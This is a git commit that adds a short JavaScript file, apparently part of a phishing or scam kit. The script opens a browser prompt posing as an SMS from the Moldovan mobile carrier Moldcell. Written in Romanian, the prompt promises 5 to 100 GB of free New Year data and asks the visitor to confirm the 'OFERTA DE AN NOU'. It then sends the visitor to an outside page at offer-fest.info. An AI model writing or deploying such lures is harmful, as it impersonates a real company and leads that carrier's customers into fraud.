8db38267f024ca9ac275182dec957362cb6ad4df
ekpesense <abantak9@gmail.com>
2025-02-01 22:20:31 -0800

    Create activation-moldcell.md.js

---
+++ activation-moldcell.md.js
@@ -0,0 +1,5 @@
+var password = 'OFERTA DE AN NOU'
+password=prompt('SMS MOLDCELL: Stimate client Moldcell, vă rugăm să primiți date gratuite de la 5 GB - 100 GB, recompensă clienților de Anul Nou, faceți clic pe OFERTA DE AN NOU pentru a verifica acum ','OFERTA DE AN NOU');
+if (password != 'OFERTA DE AN NOU') {
+location.href='https://offer-fest.info/moldcell.md.html';
+}
